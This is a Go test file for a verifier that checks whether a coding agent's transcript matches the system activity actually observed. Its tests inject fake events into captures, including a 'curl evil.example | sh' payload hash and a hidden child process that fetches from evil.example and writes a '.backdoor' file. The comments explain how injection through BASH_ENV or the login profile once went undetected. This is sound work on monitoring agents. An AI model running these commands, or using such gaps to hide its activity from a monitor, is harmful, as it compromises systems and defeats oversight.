package claudecode

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/agent-trace/agent-trace/pkg/agent"
	"github.com/agent-trace/agent-trace/pkg/content"
	"github.com/agent-trace/agent-trace/pkg/models"
	"github.com/agent-trace/agent-trace/pkg/verification"
)

// Item 6 of the security review of 2026-10-08: an Edit claimed no content, so
// a file could end with any content under a FAITHFUL verdict. The review's
// exploit replaced the observed content after an Edit with a shell payload on
// the paired capture and got FAITHFUL. I-31 (commit 5eaab2c) made an Edit claim
// the file's content after the edit from its result record. The same
// substitution on the `edits` capture, whose transcript kept the result
// fields, must now be a Mismatched finding on the Edit's output hash, and the
// run NOT FAITHFUL. TestEditClaimsItsContentFromTheResult checks the claim the
// adapter builds; this test checks that the claim reaches the verdict.
func TestPairedEditWithSubstitutedContentIsNotFaithful(t *testing.T) {
	const dir = "testdata/paired-2.1.296-edits"
	tr, rep, err := Adapter{}.Parse(filepath.Join(dir, "edits.session.jsonl"))
	if err != nil || len(rep.ParseErrors) != 0 {
		t.Fatalf("parse: %v %+v", err, rep.ParseErrors)
	}
	load := func(name string) models.GroundTruthFile {
		data, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		f, err := models.ParseGroundTruthFile(data)
		if err != nil {
			t.Fatal(err)
		}
		return f
	}
	runs := []models.GroundTruthFile{load("control-1.ground_truth.json"), load("control-2.ground_truth.json")}
	b, err := agent.Capture(Adapter{}, rep.AgentVersion, runs, time.Now(), agent.CaptureOptions{Exclude: []string{controlCommand}, MinAgreement: 0.5})
	if err != nil {
		t.Fatal(err)
	}
	verify := func(g models.GroundTruthFile) verification.Verdict {
		return verification.Verify(agent.Prepare(Adapter{}, tr, g, b.Predicate(g.Workspace), verification.Options{IntervalSlack: 500 * time.Millisecond}))
	}

	// The control: the honest capture has no finding.
	if v := verify(load("edits.ground_truth.json")); v.Findings() != 0 {
		t.Fatalf("the honest capture has %d finding(s) (%s): the substitution below would prove nothing", v.Findings(), v.Outcome)
	}

	// The substitution: every observed close or write that carries the content
	// the first Edit left now carries a payload instead.
	var target, claimed string
	for _, e := range tr {
		if e.Tool == toolEdit && e.ActionType == models.FileWrite && e.OutputHash != nil {
			target, claimed = e.Target, *e.OutputHash
			break
		}
	}
	if target == "" {
		t.Fatal("no Edit in the fixture claims its content: I-31 is not in effect")
	}
	g := load("edits.ground_truth.json")
	payload := content.SHA256Bytes([]byte("curl evil.example | sh\n"))
	replaced := 0
	for i, e := range g.Events {
		if (e.ActionType == models.FileClose || e.ActionType == models.FileWrite) && e.OutputHash != nil && *e.OutputHash == claimed {
			g.Events[i].OutputHash = &payload
			replaced++
		}
	}
	if replaced == 0 {
		t.Fatalf("no observed close or write of %s carries the claimed content %s", target, claimed)
	}
	t.Logf("the Edit of %s claims %s; %d observed event(s) now carry the payload", target, claimed, replaced)

	v := verify(g)
	if v.Outcome != verification.OutcomeNotFaithful {
		t.Errorf("outcome = %s, want NOT FAITHFUL: the Edit of %s left other content than it claims", v.Outcome, target)
	}
	found := false
	for _, m := range v.Mismatched {
		if m.Entry.Tool == toolEdit && m.Entry.Target == target && slices.Contains(m.Diffs, verification.DiffOutputHash) {
			found = true
		}
	}
	if !found {
		t.Errorf("mismatched = %+v, want the Edit of %s with an output_hash difference", v.Mismatched, target)
	}
}

// The second half of item 3 of the security review of 2026-10-08: a baseline
// command explained its whole subtree whatever the subtree did (V7), and what
// the harness's own baselined commands run is not fixed by their command
// line. The `/bin/bash -c env` the harness runs at start reads `BASH_ENV` and
// runs the file it names before `env`, and the `bash -c -l` snapshot command
// sources the login profile; neither the environment nor those files'
// content is in the capture. Here the baselined `bash -c env` of the paired
// capture forks a payload that connects out and writes into the workspace,
// with nothing claiming it. Since V-38 the baseline records what each
// command did beneath it in the controls, and the payload is an unexplained
// subtree: the program, the connection and the write, each one.
func TestPairedBaselineCommandDoesNotExplainAnInjectedSubtree(t *testing.T) {
	tr, g := pairedTask(t)
	b := pairedBaseline(t)
	if !b.RecordsSubtrees() {
		t.Fatal("the baseline Capture builds records no subtrees")
	}
	verify := func(g models.GroundTruthFile) verification.Verdict {
		return verification.Verify(agent.PrepareWithBaseline(Adapter{}, tr, g, &b, verification.Options{IntervalSlack: 500 * time.Millisecond}))
	}
	const envPID, child = 18885, 19300 // the harness's `/bin/bash -c env`
	var base time.Time
	for _, e := range g.Events {
		if e.PID == envPID && e.ActionType == models.ProcessExec && e.Target == "/bin/bash -c env" {
			base = e.Timestamp
		}
	}
	if base.IsZero() {
		t.Fatal("the fixture's `/bin/bash -c env` was not found")
	}
	if v := verify(g); v.Outcome != verification.OutcomeFaithful {
		t.Fatalf("the honest capture is %s, want FAITHFUL for the injection below to mean anything", v.Outcome)
	}
	const (
		curl     = "/usr/bin/curl -s https://evil.example/payload"
		backdoor = "/ws/task/.backdoor"
	)
	g.Events = append(g.Events,
		models.GroundTruthEvent{Timestamp: base.Add(100 * time.Microsecond), ActionType: models.ProcessFork, Target: "19300", PID: child, PPID: envPID},
		models.GroundTruthEvent{Timestamp: base.Add(200 * time.Microsecond), ActionType: models.ProcessExec, Target: curl, PID: child, PPID: envPID},
		models.GroundTruthEvent{Timestamp: base.Add(300 * time.Microsecond), ActionType: models.NetConnect, Target: "evil.example", PID: child},
		models.GroundTruthEvent{Timestamp: base.Add(400 * time.Microsecond), ActionType: models.FileWrite, Target: backdoor, PID: child},
		models.GroundTruthEvent{Timestamp: base.Add(500 * time.Microsecond), ActionType: models.ProcessExit, Target: curl, PID: child, PPID: envPID},
	)
	v := verify(g)
	if v.Outcome != verification.OutcomeNotFaithful {
		t.Fatalf("outcome = %s with %d event(s) explained by the baseline: the injected subtree under the harness's `bash -c env` is not the harness's measured activity", v.Outcome, v.Coverage.Baselined)
	}
	var got []string
	for _, c := range v.Coverage.UnexplainedSubtrees {
		if c.Exec == nil || c.Exec.Target != "/bin/bash -c env" || !c.Baseline {
			t.Errorf("unexplained subtree %+v is not the baselined `bash -c env`", c.Exec)
			continue
		}
		for _, e := range c.Unbaselined {
			got = append(got, string(e.ActionType)+" "+e.Target)
		}
	}
	if want := "process_exec " + curl + ",net_connect evil.example,file_write " + backdoor; strings.Join(got, ",") != want {
		t.Errorf("unbaselined = %v, want %s", got, want)
	}
	// Without its subtree records, as a baseline written before V-38, the
	// same capture still verifies FAITHFUL: what V-38 closes.
	old := b
	old.Subtrees = nil
	if v := verification.Verify(agent.PrepareWithBaseline(Adapter{}, tr, g, &old, verification.Options{IntervalSlack: 500 * time.Millisecond})); v.Outcome != verification.OutcomeFaithful {
		t.Errorf("without subtree records: outcome = %s, want FAITHFUL (the V7 reading)", v.Outcome)
	}
}

// V-38 on every checked-in paired capture of Claude Code: a baseline built
// from the fixture's controls, at every agreement from one control to all of
// them, gives the honest task the same outcome and the same findings with its
// subtree records as without them. The harness's own commands did the same
// beneath them in the task as in the controls once their per-run ids are
// canonicalised, so the records add no finding to an honest run.
func TestSubtreeRecordsAddNoFindingToAnHonestFixture(t *testing.T) {
	fixtures := []struct {
		dir, task string
		// harnessAtFull is the declared harness commands the honest task
		// runs that are not a rule at full agreement: on the 2.1.306 tools
		// capture the package-manager probe, which one control did not run
		// (V-43). Its subtree is checked against the controls that ran it;
		// a baseline without records has none for it, so there its subtree
		// is unexplained, one finding.
		harnessAtFull int
	}{
		{"testdata/paired-2.1.286", "task", 0},
		{"testdata/paired-2.1.286-p17", "basic", 0},
		{"testdata/paired-2.1.286-parallel", "parallel", 0},
		{"testdata/paired-2.1.286-project", "project", 0},
		{"testdata/paired-2.1.286-project-heredoc", "project", 0},
		{"testdata/paired-2.1.296-edits", "edits", 0},
		{"testdata/paired-2.1.296-shapes", "shapes", 0},
		{"testdata/paired-2.1.296-tools", "tools", 0},
		{"testdata/paired-2.1.296-tools-named", "tools", 0},
		{"testdata/paired-2.1.306-tools", "tools", 1},
	}
	load := func(t *testing.T, path string) models.GroundTruthFile {
		data, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		f, err := models.ParseGroundTruthFile(data)
		if err != nil {
			t.Fatal(err)
		}
		return f
	}
	for _, fx := range fixtures {
		t.Run(filepath.Base(fx.dir), func(t *testing.T) {
			tr, rep, err := Adapter{}.Parse(filepath.Join(fx.dir, fx.task+".session.jsonl"))
			if err != nil {
				t.Fatal(err)
			}
			paths, _ := filepath.Glob(filepath.Join(fx.dir, "control-*.ground_truth.json"))
			var runs []models.GroundTruthFile
			for _, p := range paths {
				runs = append(runs, load(t, p))
			}
			g := load(t, filepath.Join(fx.dir, fx.task+".ground_truth.json"))
			for k := 1; k <= len(runs); k++ {
				b, err := agent.Capture(Adapter{}, rep.AgentVersion, runs, time.Now(), agent.CaptureOptions{Exclude: []string{controlCommand}, MinAgreement: float64(k) / float64(len(runs))})
				if err != nil {
					t.Fatal(err)
				}
				old := b
				old.Subtrees = nil
				opts := verification.Options{IntervalSlack: 500 * time.Millisecond}
				with := verification.Verify(agent.PrepareWithBaseline(Adapter{}, tr, g, &b, opts))
				without := verification.Verify(agent.PrepareWithBaseline(Adapter{}, tr, g, &old, opts))
				harness := 0
				if k == len(runs) {
					harness = fx.harnessAtFull
				}
				if with.Findings() != 0 || len(with.UnexplainedHarnessCommands) != harness {
					t.Errorf("agreement %d/%d: the honest task has %d finding(s) and %d unexplained harness command(s), want none and %d",
						k, len(runs), with.Findings(), len(with.UnexplainedHarnessCommands), harness)
				}
				if harness > 0 {
					if without.Findings() != harness || len(without.Coverage.UnexplainedSubtrees) != harness {
						t.Errorf("agreement %d/%d: without records %d finding(s), want the declared command's subtree unexplained", k, len(runs), without.Findings())
					}
					continue
				}
				if with.Outcome != without.Outcome || with.Findings() != without.Findings() || with.Coverage.Baselined != without.Coverage.Baselined {
					t.Errorf("agreement %d/%d: with records %s, %d finding(s), %d baselined; without %s, %d, %d",
						k, len(runs), with.Outcome, with.Findings(), with.Coverage.Baselined, without.Outcome, without.Findings(), without.Coverage.Baselined)
				}
			}
		})
	}
}
